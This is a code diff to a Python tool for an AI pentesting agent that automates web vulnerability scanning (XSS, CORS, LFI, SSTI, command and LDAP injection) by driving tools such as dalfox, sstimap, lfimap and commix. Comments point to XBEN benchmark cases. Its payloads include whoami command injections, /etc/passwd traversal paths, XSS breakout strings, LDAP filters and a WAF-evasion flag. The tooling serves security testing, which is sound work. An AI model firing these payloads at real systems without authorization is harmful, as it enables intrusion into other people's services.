@@ -6,21 +6,25 @@ import base64
 import glob
 import json
 import os
+import random
 import re
 import subprocess
+import sys
 import tempfile
+import time
 from dataclasses import dataclass
+from pathlib import Path
 from subprocess import DEVNULL
-from typing import Any, Dict, List
+from typing import Any, Dict, List, Optional, Set, Literal
 from urllib.parse import parse_qs, urlencode, urlparse, urlunparse
 
 import requests
 import urllib3
-from strands import tool
+from strands import tool, ToolContext
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# We need to bound the tool or it can take a very long time.
+# We need to bound the tool, or it can take a very long time.
 _PARAMETER_COUNT_LIMIT = 5
 
 _ARJUN_RESPONSE_PARAMS = re.compile(r"\b(\w+)(?=,|$)\b")
@@ -57,13 +61,22 @@ _RE_LFIMAP_PAYLOADS = re.compile(r"testing (.+) payloads", re.IGNORECASE)
 # [*] testing rfi with command: http://example.com/rfi_test.txt?cmd=id
 _RE_RFIMAP_PAYLOADS = re.compile(r"testing (rfi) with command\S*:\s+(.+)", re.IGNORECASE)
 
-def _b64(input) -> str:
-    if input is None:
+SECLISTS_PATHS = [
+    Path("/usr/share/seclists"),
+    Path.home() / "seclists",
+    Path.home() / "SecLists",
+    Path.home() / "wordlists" / "seclists",
+    Path.home() / "wordlists" / "SecLists",
+]
+
+
+def _b64(plaintext) -> str:
+    if plaintext is None:
         return ""
-    if isinstance(input, bytes):
-        input_bytes = input
+    if isinstance(plaintext, bytes):
+        input_bytes = plaintext
     else:
-        input_bytes = str(input).encode(encoding="utf-8", errors="ignore")
+        input_bytes = str(plaintext).encode(encoding="utf-8", errors="ignore")
     return base64.b64encode(input_bytes).decode('ascii')
 
 
@@ -81,24 +94,25 @@ def _coerce_str(arg: bytes | str | None) -> str:
 class RequestConfig:
     target_url: str
     http_method: str = "GET"
-    cookies: Dict[str, str] = None
-    headers: Dict[str, str] = None
+    cookies: Optional[Dict[str, str]] = None
+    headers: Optional[Dict[str, str]] = None
 
     def inject_in_body(self):
         return self.http_method.upper() in ["POST", "PUT", "PATCH", "DELETE"]
 
 
-@tool
+@tool(context=True)
 def advanced_payload_coordinator(
         target_url: str,
-        test_type: str = "comprehensive",
+        test_type: Literal["comprehensive", "xss", "lfi", "ssti", "command_injection", "ldap_injection", "param_discovery", "cors"] = "comprehensive",
         parameters: str = None,
         http_method: str = "GET",
-        cookies: Dict[str, str] = None,
-        headers: Dict[str, str] = None,
+        cookies: Optional[Dict[str, str]] = None,
+        headers: Optional[Dict[str, str]] = None,
+        tool_context: Optional[ToolContext] = None,
 ) -> str:
     """
-    Run coordinated payload-based web vuln testing (XSS/CORS/LFI/SSTI/command/LDAP) against a single URL. SQLi is not supported.
+    Run coordinated payload-based web vuln testing (XSS/CORS/LFI/SSTI/command/LDAP) against a single URL. SQLi is *NOT* supported.
 
     When to call:
     - You have a target URL (optionally authenticated via cookies/headers) and need fast confirmation/triage of
@@ -114,7 +128,7 @@ def advanced_payload_coordinator(
     - cookies/headers: include auth/session + any required custom headers.
 
     Returns:
-    - JSON (no prose), intended for agents. Key fields:
+    - JSON. Key fields:
       - parameters_discovered: list of params to drive follow-on fuzzing.
       - payload_results: per-test records (include tool, parameter, payload_type, evidence, url/method when relevant).
       - vulnerabilities: subset of payload_results where vulnerable=true (use as primary signal).
@@ -132,11 +146,18 @@ def advanced_payload_coordinator(
     if not target_url.startswith(("http://", "https://")):
         target_url = f"https://{target_url}"
 
-    if "sql" in test_type.lower():
-        raise ValueError("SQLi is not supported")
+    verbose = tool_context is None
+
+    test_type = (test_type or "comprehensive").lower().strip()
+
+    if "sql" in test_type:
+        # Some LLMs are bent on using this for SQLi
+        raise ValueError("SQLi is not supported by this tool, try sqlmap")
+    if "directory_brute_force" in test_type or "file_brute_force" in test_type:
+        # Come on LLM, stop making things up ...
+        raise ValueError("Directory/file brute forcing is not supported by this tool, try feroxbuster or ffuf")
 
     # normalize test types
-    test_type = test_type.lower() if test_type else "comprehensive"
     if test_type in {"local_file", "local_file_inclusion"}:
         test_type = "lfi"
     elif test_type in {"template_injection", "template"}:
@@ -178,24 +199,35 @@ def advanced_payload_coordinator(
         "errors": [],
     }
 
+    if verbose:
+        print(f"[*] Starting coordinated testing for {target_url} (type: {test_type})", file=sys.stderr)
+
     try:
         # Setup specialized testing tools
-        tools_setup = _setup_payload_tools()
+        if verbose:
+            print("[*] Setting up specialized testing tools...", file=sys.stderr)
+        tools_setup = setup_payload_tools()
         results["tools"] = tools_setup
 
         # Parameter discovery and expansion
         if not parameters or test_type in ["param_discovery"]:
-            discovered_params = _advanced_parameter_discovery(request_config, parameters, tools=tools_setup["tools"])
+            if verbose:
+                print("[*] Running parameter discovery...", file=sys.stderr)
+            discovered_params = advanced_parameter_discovery(request_config, parameters, tools=tools_setup["tools"])
             if not discovered_params and request_config.http_method == "GET":
                 # try again with POST
                 request_config.http_method = "POST"
-                discovered_params_post = _advanced_parameter_discovery(
+                if verbose:
+                    print("[*] No parameters found with GET, trying POST for discovery...", file=sys.stderr)
+                discovered_params_post = advanced_parameter_discovery(
                     request_config, parameters, tools=tools_setup["tools"]
                 )
                 if discovered_params_post:
                     discovered_params = discovered_params_post
                 else:
                     request_config.http_method = "GET"
+            if discovered_params and verbose:
+                print(f"[*] Parameter discovery: {request_config.http_method} {discovered_params}", file=sys.stderr)
         else:
             discovered_params = [p.strip() for p in parameters.split(",") if p.strip()]
         results["http_method"] = request_config.http_method
@@ -203,18 +235,25 @@ def advanced_payload_coordinator(
 
         # XSS payload coordination and testing
         if test_type in ["xss", "comprehensive"]:
+            if verbose:
+                print(f"[*] Starting XSS testing on {len(results['parameters_discovered'])} parameters...",
+                      file=sys.stderr)
             xss_results = _coordinate_xss_testing(
                 request_config,
                 results.get("parameters_discovered", []),
                 tools=tools_setup["tools"],
+                verbose=verbose,
             )
             xss_vulns = [r for r in xss_results if r.get("vulnerable", False)]
             if not xss_vulns and request_config.http_method == "GET":
                 request_config.http_method = "POST"
+                if verbose:
+                    print("[*] No XSS found with GET, trying POST...", file=sys.stderr)
                 xss_results_post = _coordinate_xss_testing(
                     request_config,
                     results.get("parameters_discovered", []),
                     tools=tools_setup["tools"],
+                    verbose=verbose,
                 )
                 xss_vulns = [r for r in xss_results_post if r.get("vulnerable", False)]
                 if xss_vulns:
@@ -227,6 +266,8 @@ def advanced_payload_coordinator(
 
         # CORS misconfiguration testing
         if test_type in ["cors", "comprehensive"]:
+            if verbose:
+                print("[*] Starting CORS misconfiguration testing...", file=sys.stderr)
             cors_results = _test_cors_configurations(request_config, tools=tools_setup["tools"])
             results["payload_results"].extend(cors_results)
             cors_issues = [r for r in cors_results if r.get("vulnerable", False)]
@@ -245,20 +286,28 @@ def advanced_payload_coordinator(
             else:
                 focus_injection_types = None
 
+            if verbose:
+                msg = f"[*] Starting injection testing ({test_type}) on {len(results['parameters_discovered'])} parameters..."
+                print(msg, file=sys.stderr)
+
             injection_results = _coordinate_injection_testing(
                 request_config,
                 results.get("parameters_discovered", []),
                 tools=tools_setup["tools"],
                 focus_injection_types=focus_injection_types,
+                verbose=verbose,
             )
             injection_vulns = [r for r in injection_results if r.get("vulnerable", False)]
             if not injection_vulns and request_config.http_method == "GET":
                 request_config.http_method = "POST"
+                if verbose:
+                    print("[*] No injection vulnerabilities found with GET, trying POST...", file=sys.stderr)
                 injection_results_post = _coordinate_injection_testing(
                     request_config,
                     results.get("parameters_discovered", []),
                     tools=tools_setup["tools"],
                     focus_injection_types=focus_injection_types,
+                    verbose=verbose,
                 )
                 injection_vulns = [r for r in injection_results_post if r.get("vulnerable", False)]
                 if injection_vulns:
@@ -270,11 +319,16 @@ def advanced_payload_coordinator(
             results["vulnerabilities"].extend(injection_vulns)
 
         # Intelligence analysis and payload coordination
+        if verbose:
+            print("[*] Analyzing findings and generating recommendations...", file=sys.stderr)
         intelligence = _analyze_payload_intelligence(results["payload_results"])
         results["intelligence"] = intelligence
 
         # Generate coordinated next-step recommendations
         results["recommendations"] = _generate_payload_recommendations(test_type, results)
+
+        if verbose:
+            print(f"[*] Testing complete. Found {len(results['vulnerabilities'])} vulnerabilities.", file=sys.stderr)
 
         # Compact counts for fast agent routing
         results["counts"] = {
@@ -295,22 +349,24 @@ def advanced_payload_coordinator(
     return json.dumps(results, ensure_ascii=False, indent=2, sort_keys=True)
 
 
-def _setup_payload_tools() -> Dict[str, Any]:
-    """Setup specialized payload testing tools"""
+def setup_payload_tools(tools_limit: Set[str] = None) -> Dict[str, Any]:
+    """Set up specialized payload testing tools"""
     tools_status = {"tools": [], "failed": []}
 
-    # Specialized tools from awesome-bugbounty-tools
+    # Specialized tools from awesome-bugbounty-tools: (command, github URL, python package)
     specialized_tools = [
-        ("dalfox", "github.com/hahwul/dalfox/v2@latest"),
-        ("arjun", None),  # Python tool
-        ("corsy", None),  # Python tool
-        ("paramspider", None),  # Python tool
-        ("lfimap", None),  # Python tool, pipx install --global lfimap-ng
-        ("sstimap", None),  # Python tool, https://github.com/vladko312/SSTImap.git
-        ("commix", None),  # Python tool, https://github.com/commixproject/commix.git
+        ("dalfox", "github.com/hahwul/dalfox/v2@latest", None),
+        ("arjun", None, "arjun"),  # Python tool
+        ("corsy", None, "corsy",),  # Python tool
+        ("paramspider", None, "ParamSpider"),  # Python tool
+        ("lfimap", None, "lfimap-ng"),  # Python tool, pipx install --global lfimap-ng
+        ("sstimap", None, "sstimap"),  # Python tool, https://github.com/vladko312/SSTImap.git
+        ("commix", None, "commix"),  # Python tool, https://github.com/commixproject/commix.git
     ]
 
-    for tool_name, install_path in specialized_tools:
+    for tool_name, install_path, pip_name in specialized_tools:
+        if tools_limit and tool_name not in tools_limit:
+            continue
         try:
             # Check if tool exists
             check_cmd = ["which", tool_name]
@@ -327,24 +383,24 @@ def _setup_payload_tools() -> Dict[str, Any]:
                     tools_status["tools"].append(tool_name)
                 else:
                     tools_status["failed"].append(tool_name)
-            else:
-                # Python tool - try pip install
-                pip_names = {"arjun": "arjun", "corsy": "corsy", "sstimap": "sstimap", "paramspider": "ParamSpider", "commix": "commix"}
-                if tool_name in pip_names:
-                    install_cmd = ["pip3", "install", pip_names[tool_name]]
-                    result = subprocess.run(install_cmd, stdin=DEVNULL, capture_output=True, timeout=120)
-                    if result.returncode == 0:
-                        tools_status["tools"].append(tool_name)
-                    else:
-                        tools_status["failed"].append(tool_name)
+            elif pip_name:
+                install_cmd = ["pip3", "install", pip_name]
+                result = subprocess.run(install_cmd, stdin=DEVNULL, capture_output=True, timeout=120)
+                if result.returncode == 0:
+                    tools_status["tools"].append(tool_name)
+                else:
+                    tools_status["failed"].append(tool_name)
         except Exception:
             tools_status["failed"].append(tool_name)
 
     return tools_status
 
 
-def _advanced_parameter_discovery(request_config: RequestConfig, provided_params: str = None,
-                                  tools: List[str] = None) -> List[str]:
+def advanced_parameter_discovery(
+        request_config: RequestConfig,
+        provided_params: str = None,
+        tools: List[str] = None
+) -> List[str]:
     """Advanced parameter discovery using multiple techniques"""
     target_url = request_config.target_url
 
@@ -355,7 +411,16 @@ def _advanced_parameter_discovery(request_config: RequestConfig, provided_params
         provided_list = [p.strip() for p in provided_params.split(",") if p.strip()]
         discovered_params.update(provided_list)
 
-    # Method 1: Arjun parameter discovery (if available)
+    # Extract from URL if it has parameters
+    try:
+        parsed_url = urlparse(target_url)
+        if parsed_url.query:
+            url_params = parse_qs(parsed_url.query)
+            discovered_params.update(url_params.keys())
+    except Exception:
+        pass
+
+    # Arjun parameter discovery (if available)
     if "arjun" in tools:
         arjun_out = ""
         arjun_path = None
@@ -404,11 +469,11 @@ def _advanced_parameter_discovery(request_config: RequestConfig, provided_params
             pass
         if arjun_out:
             for line in arjun_out.splitlines():
-                if "for testing:" in line:
-                    for param in _ARJUN_RESPONSE_PARAMS.findall(line.split("for testing:")[1]):
+                if "Parameters found:" in line:
+                    for param in _ARJUN_RESPONSE_PARAMS.findall(line.split("Parameters found:")[1]):
                         discovered_params.add(param)
 
-    # Method 2: ParamSpider (if available)
+    # ParamSpider (if available)
     if "paramspider" in tools:
         try:
             domain = urlparse(target_url).netloc
@@ -442,7 +507,7 @@ def _advanced_parameter_discovery(request_config: RequestConfig, provided_params
         except Exception:
             pass
 
-    # Method 3: Common parameter wordlist
+    # Common parameter wordlist
     common_params = [
         "id",
         "user",
@@ -514,15 +579,6 @@ def _advanced_parameter_discovery(request_config: RequestConfig, provided_params
                         discovered_params.add(param)
         except Exception:
             pass
-
-    # Method 4: Extract from URL if it has parameters
-    try:
-        parsed_url = urlparse(target_url)
-        if parsed_url.query:
-            url_params = parse_qs(parsed_url.query)
-            discovered_params.update(url_params.keys())
-    except Exception:
-        pass
 
     return sorted(list(discovered_params))
 
@@ -833,13 +889,19 @@ def _parse_lfimap_output(param: str, http_method: str, stdout: str) -> List[Dict
     return findings
 
 
-def _coordinate_xss_testing(request_config: RequestConfig, parameters: List[str], tools: List[str] = None) -> List[
+def _coordinate_xss_testing(
+        request_config: RequestConfig,
+        parameters: List[str],
+        tools: List[str] = None,
+        verbose: bool = False,
+) -> List[
     Dict[str, Any]]:
     """Coordinate XSS testing using advanced payloads and techniques"""
     # XBEN-008-24 is a good test case. Target the '/page' endpoint, 'name' parameter, GET method.
     tools = [] if tools is None else tools
     target_url = request_config.target_url
 
+    timeout_seconds = 600
     xss_results = []
 
     if not parameters:
@@ -849,6 +911,8 @@ def _coordinate_xss_testing(request_config: RequestConfig, parameters: List[str]
     if "dalfox" in tools:
         dalfox_out = ""
         dalfox_timeout = False
+        if verbose and len(parameters) > _PARAMETER_COUNT_LIMIT:
+            print(f"[!] Limiting dalfox testing by parameter count limit {_PARAMETER_COUNT_LIMIT}", file=sys.stderr)
         dalfox_params = set(parameters[:_PARAMETER_COUNT_LIMIT])
         try:
             cmd = [
@@ -869,7 +933,7 @@ def _coordinate_xss_testing(request_config: RequestConfig, parameters: List[str]
                 "--waf-evasion",
                 "--silence",
                 "--format", "json",
-                "--timeout", "10",
+                "--timeout", str(timeout_seconds // 60),
             ]
 
             if request_config.cookies:
@@ -885,6 +949,9 @@ def _coordinate_xss_testing(request_config: RequestConfig, parameters: List[str]
 
             for param in dalfox_params:
                 cmd.extend(["--param", param])
+
+            if verbose:
+                print(f"[*] XSS testing parameters {dalfox_params} using dalfox ...", file=sys.stderr)
 
             result = subprocess.run(cmd, capture_output=True, text=True, stdin=DEVNULL, timeout=300)
 
@@ -948,6 +1015,9 @@ def _coordinate_xss_testing(request_config: RequestConfig, parameters: List[str]
                         {"parameter": param, "vulnerable": False, "payload_type": "XSS tested", "tool": "dalfox"}
                     )
 
+            # dalfox was called, trust the results
+            return xss_results
+
     # Test parameters not covered by dalfox
     tested_params = {r["parameter"] for r in xss_results}
     remaining_params = [p for p in parameters if p not in tested_params]
@@ -955,14 +1025,23 @@ def _coordinate_xss_testing(request_config: RequestConfig, parameters: List[str]
         return xss_results
 
     # Method 2: Modern XSS payloads with realistic exploitation context
-    advanced_xss_payload_files = [ "/usr/share/seclists/Fuzzing/XSS/robot-friendly/XSS-Cheat-Sheet-PortSwigger.txt" ]
+    advanced_xss_payload_files = [p / "Fuzzing" / "XSS" / "robot-friendly" / "XSS-Cheat-Sheet-PortSwigger.txt" for p in
+                                  SECLISTS_PATHS]
     advanced_xss_payloads = None
     for file in advanced_xss_payload_files:
         if os.path.isfile(file) and os.access(file, os.R_OK):
             try:
-                advanced_xss_payloads = open(file).read().splitlines()
-                if advanced_xss_payloads:
+                payloads = open(file).read().splitlines()
+                if not payloads:
                     break
+                advanced_xss_payloads = []
+                for payload in payloads:
+                    advanced_xss_payloads.append(payload)
+                    advanced_xss_payloads.append("'\\\">" + payload)  # Breaking out of attributes
+                random.shuffle(advanced_xss_payloads)
+                advanced_xss_payloads.insert(0, "\\\";alert(1);//")  # Breaking out of JavaScript strings
+                if verbose:
+                    print(f"[*] Loaded {len(advanced_xss_payloads)} XSS payloads from {file}", file=sys.stderr)
             except Exception:
                 pass
     if not advanced_xss_payloads:
@@ -990,8 +1069,14 @@ def _coordinate_xss_testing(request_config: RequestConfig, parameters: List[str]
             "'\\\"><svg/onload=alert(1)>",
         ]
 
+    timeout_per_param = max(60, timeout_seconds // len(remaining_params))
+    time_scan_start = time.time()
     for param in remaining_params:
+        if verbose:
+            print(f"[*] XSS testing on parameter {param} using requests ...", file=sys.stderr)
+
         encoded_found_count = 0  # limit how many encoded params we report
+        time_param_start = time.time()
         for payload in advanced_xss_payloads:
             try:
                 # Create test request
@@ -1038,11 +1123,17 @@ def _coordinate_xss_testing(request_config: RequestConfig, parameters: List[str]
             except Exception:
                 continue
 
+            if time.time() - time_param_start > timeout_per_param:
+                break
+
         # If no vulnerability found, add negative result
         if param not in {r["parameter"] for r in xss_results}:
             xss_results.append(
                 {"parameter": param, "vulnerable": False, "payload_type": "XSS tested", "tool": "custom"}
             )
+
+        if time.time() - time_scan_start > timeout_seconds:
+            break
 
     return xss_results
 
@@ -1134,9 +1225,11 @@ def _coordinate_injection_testing(
         parameters: List[str],
         tools: List[str] = None,
         focus_injection_types: set[str] | None = None,
+        verbose: bool = False,
 ) -> List[Dict[str, Any]]:
     """Coordinate advanced injection testing (beyond SQL)"""
     tools = [] if tools is None else tools
+    timeout_seconds = 300
     target_url = request_config.target_url
     focus = {t.strip() for t in (focus_injection_types or set()) if t and str(t).strip()}
 
@@ -1167,25 +1260,30 @@ def _coordinate_injection_testing(
     command_payloads = ["; whoami", "| whoami", "& whoami", "`whoami`", "$(whoami)"]
 
     # LDAP injection payloads
-    ldap_fuzzing_lists = ["/usr/share/seclists/Fuzzing/LDAP.Fuzzing.txt"]
+    ldap_fuzzing_lists = [p / "Fuzzing" / "LDAP.Fuzzing.txt" for p in SECLISTS_PATHS]
     ldap_payloads = []
     for ldap_fuzzing_list in ldap_fuzzing_lists:
         if os.path.exists(ldap_fuzzing_list):
             with open(ldap_fuzzing_list, "r") as f:
                 ldap_payloads = f.read().splitlines()
+                if verbose:
+                    print(f"[*] Loaded {len(ldap_payloads)} LDAP payloads from {ldap_fuzzing_list}", file=sys.stderr)
                 break
     if not ldap_payloads:
         ldap_payloads = ["*", "*)(&", "*))%00", "admin*)((|userPassword=*)", "*))(|(objectClass=*"]
 
-    lfi_lists = ["/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt", "/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt"]
+    lfi_lists = [p / "Fuzzing" / "LFI" / "LFI-Jhaddix.txt" for p in SECLISTS_PATHS]
+    lfi_lists.extend([p / "Fuzzing" / "LFI" / "LFI-LFISuite-pathtotest.txt" for p in SECLISTS_PATHS])
     lfi_payloads = []
     for lfi_list in lfi_lists:
         if os.path.exists(lfi_list):
             with open(lfi_list, "r") as f:
                 lfi_payloads = f.read().splitlines()
+                if verbose:
+                    print(f"[*] Loaded {len(lfi_payloads)} LFI payloads from {lfi_list}", file=sys.stderr)
                 break
     if not lfi_payloads:
-        lfi_payloads = ["../../../../etc/passwd"]
+        lfi_payloads = ["../../../../etc/passwd", "../../../../../../../../windows/win.ini"]
 
     injection_types = [
         ("LFI", lfi_payloads),
@@ -1198,6 +1296,8 @@ def _coordinate_injection_testing(
         injection_types = [(t, payloads) for (t, payloads) in injection_types if t in focus]
 
     # Test each parameter with different injection types
+    if verbose and len(parameters) > _PARAMETER_COUNT_LIMIT:
+        print(f"[!] Limiting {injection_types} testing by parameter count limit {_PARAMETER_COUNT_LIMIT}", file=sys.stderr)
     parameters_under_test = set(parameters[:_PARAMETER_COUNT_LIMIT])
 
     # SSTImap
@@ -1232,7 +1332,10 @@ def _coordinate_injection_testing(
                     for name, value in request_config.headers.items():
                         cmd.extend(["--header", f"{name}: {value}"])
 
-                result = subprocess.run(cmd, capture_output=True, text=True, stdin=DEVNULL, timeout=300)
+                if verbose:
+                    print(f"[*] SSTI testing parameter {param} using sstimap ...", file=sys.stderr)
+
+                result = subprocess.run(cmd, capture_output=True, text=True, stdin=DEVNULL, timeout=timeout_seconds)
 
                 if result.returncode == 0 and result.stdout:
                     sstimap_out = result.stdout
@@ -1243,6 +1346,7 @@ def _coordinate_injection_testing(
                 pass
 
             if sstimap_out:
+                injection_types = [x for x in injection_types if x[0] != "SSTI"]
                 ssti_findings = _parse_sstimap_output(sstimap_out)
                 # Attach URL context and ensure parameter consistency with the param under test.
                 for f in ssti_findings:
@@ -1254,8 +1358,6 @@ def _coordinate_injection_testing(
                     # Mark that this parameter was found vulnerable so we don't add a negative summary later.
                     injection_results.append(f)
                     parameters_under_test.discard(param)
-                    if not sstimap_timeout and focus:
-                        injection_types = [x for x in injection_types if x[0] != "SSTI"]
 
     # lfimap
     # XBEN-061-24: /post.php?id=../../../../FLAG.php
@@ -1287,7 +1389,11 @@ def _coordinate_injection_testing(
                 if request_config.headers:
                     cmd.extend(["--headers", "; ".join([f"{name}={value}" for name, value in request_config.headers.items()])])
 
-                result = subprocess.run(cmd, bufsize=4096, capture_output=True, text=True, input=(400 * "exit\n"), timeout=300)
+                if verbose:
+                    print(f"[*] LFI testing parameter {param} using lfimap ...", file=sys.stderr)
+
+                result = subprocess.run(cmd, bufsize=4096, capture_output=True, text=True, input=(400 * "exit\n"),
+                                        timeout=timeout_seconds)
 
                 if result.returncode == 0 and result.stdout:
                     lfimap_out = result.stdout
@@ -1298,6 +1404,7 @@ def _coordinate_injection_testing(
                 pass
 
             if lfimap_out:
+                injection_types = [x for x in injection_types if x[0] != "LFI"]
                 lfi_findings = _parse_lfimap_output(param, request_config.http_method, lfimap_out)
                 # Attach URL context and ensure parameter consistency with the param under test.
                 for f in lfi_findings:
@@ -1308,8 +1415,6 @@ def _coordinate_injection_testing(
                     # Mark that this parameter was found vulnerable so we don't add a negative summary later.
                     injection_results.append(f)
                     parameters_under_test.discard(param)
-                    if not lfimap_timeout and focus:
-                        injection_types = [x for x in injection_types if x[0] != "LFI"]
 
     # command injection
     # XBEN-073-24
@@ -1322,8 +1427,6 @@ def _coordinate_injection_testing(
                 for param in parameters_under_test:
                     test_url = _add_or_replace_query_param(test_url, param, "test")
 
-            time_limit = 300
-
             cmd = [
                 "commix",
                 "--batch",
@@ -1333,7 +1436,7 @@ def _coordinate_injection_testing(
                 "--random-agent",
                 "--level", "3",
                 "--disable-coloring",
-                f"--time-limit={time_limit-10}",
+                f"--time-limit={timeout_seconds - 10}",
                 "-u", test_url,
                 "--method="+request_config.http_method,
             ]
@@ -1353,7 +1456,10 @@ def _coordinate_injection_testing(
                 cmd.extend(["-p", param])
 
             # commix requires targets on stdin when it is not a tty
-            result = subprocess.run(cmd, capture_output=True, text=True, input=test_url, timeout=time_limit)
+            if verbose:
+                print(f"[*] Command injection testing parameter(s) {parameters_under_test} using commix ...",
+                      file=sys.stderr)
+            result = subprocess.run(cmd, capture_output=True, text=True, input=test_url, timeout=timeout_seconds)
 
             if result.returncode == 0 and result.stdout:
                 commix_out = result.stdout
@@ -1364,6 +1470,7 @@ def _coordinate_injection_testing(
             pass
 
         if commix_out:
+            injection_types = [x for x in injection_types if x[0] != "Command Injection"]
             for m in _RE_COMMIX_VULN.finditer(commix_out):
                 param = m.group(1)
                 if param in parameters_under_test:
@@ -1379,67 +1486,72 @@ def _coordinate_injection_testing(
                             "tool": "commix",
                         }
                     )
-                    if not commix_timeout and focus:
-                        injection_types = [x for x in injection_types if x[0] != "Command Injection"]
 
-    for param in parameters_under_test:
-        found_for_param = False
-        for injection_type, payloads in injection_types:
-            for payload in payloads:
-                try:
-                    response = _requests_get_text(target_url, {param: payload}, request_config, timeout=10)
-                    if response is not None:
-                        # Check for injection indicators
-                        vulnerable = False
-                        evidence = ""
+    if parameters_under_test:
+        time_scan_start = time.time()
+        timeout_per_param = max(60, timeout_seconds // len(parameters_under_test))
+        for param in parameters_under_test:
+            found_for_param = False
+            time_param_start = time.time()
+            for injection_type, payloads in injection_types:
+                for payload in payloads:
+                    try:
+                        response = _requests_get_text(target_url, {param: payload}, request_config, timeout=10)
+                        if response is not None:
+                            # Check for injection indicators
+                            vulnerable = False
+                            evidence = ""
 
-                        if injection_type == "SSTI":
-                            # Check for template evaluation
-                            if "1764" in response and "42*42" in payload:
-                                vulnerable = True
-                                evidence = "Template evaluation detected (42*42=1764)"
-                            elif payload in response and "config" in payload:
-                                vulnerable = True
-                                evidence = "Configuration disclosure detected"
+                            if injection_type == "SSTI":
+                                # Check for template evaluation
+                                if "1764" in response and "42*42" in payload:
+                                    vulnerable = True
+                                    evidence = "Template evaluation detected (42*42=1764)"
+                                elif payload in response and "config" in payload:
+                                    vulnerable = True
+                                    evidence = "Configuration disclosure detected"
 
-                        elif injection_type == "Command Injection":
-                            # Check for command execution indicators
-                            # Avoid the obvious reflection false-positive: the string "whoami" may simply echo back.
-                            if any(indicator in response.lower() for indicator in ["uid=", "gid=", "root:"]):
-                                vulnerable = True
-                                evidence = "Command execution indicators detected"
+                            elif injection_type == "Command Injection":
+                                # Check for command execution indicators
+                                # Avoid the obvious reflection false-positive: the string "whoami" may simply echo back.
+                                if any(indicator in response.lower() for indicator in ["uid=", "gid=", "root:"]):
+                                    vulnerable = True
+                                    evidence = "Command execution indicators detected"
 
-                        elif injection_type == "LDAP Injection":
-                            # Check for LDAP error patterns or unexpected responses
-                            if any(
-                                indicator in response.lower()
-                                for indicator in ["ldap", "invalid dn", "bad search filter"]
-                            ):
-                                vulnerable = True
-                                evidence = "LDAP error patterns detected"
+                            elif injection_type == "LDAP Injection":
+                                # Check for LDAP error patterns or unexpected responses
+                                if any(
+                                    indicator in response.lower()
+                                    for indicator in ["ldap", "invalid dn", "bad search filter"]
+                                ):
+                                    vulnerable = True
+                                    evidence = "LDAP error patterns detected"
 
-                        if vulnerable:
-                            injection_results.append(
-                                {
-                                    "vulnerable": True,
-                                    "url": target_url,
-                                    "parameter": param,
-                                    "method": request_config.http_method,
-                                    "injection_type": injection_type,
-                                    "payload": payload,
-                                    "evidence": evidence,
-                                    "tool": "custom",
-                                }
-                            )
-                            found_for_param = True
-                            break  # break payload loop
+                            if vulnerable:
+                                injection_results.append(
+                                    {
+                                        "vulnerable": True,
+                                        "url": target_url,
+                                        "parameter": param,
+                                        "method": request_config.http_method,
+                                        "injection_type": injection_type,
+                                        "payload": payload,
+                                        "evidence": evidence,
+                                        "tool": "custom",
+                                    }
+                                )
+                                found_for_param = True
+                                break  # break payload loop
 
-                except Exception:
-                    continue
-            if found_for_param:
-                break  # break injection_type loop
-        if found_for_param:
-            continue  # next parameter
+                    except Exception:
+                        continue
+                if found_for_param:
+                    break  # break injection_type loop
+                if time.time() - time_param_start > timeout_per_param:
+                    break
+
+            if time.time() - time_scan_start > timeout_seconds:
+                break
 
     # Add summary for tested parameters without vulnerabilities
     tested_params = {r.get("parameter") for r in injection_results if r.get("vulnerable", False) and r.get("parameter")}
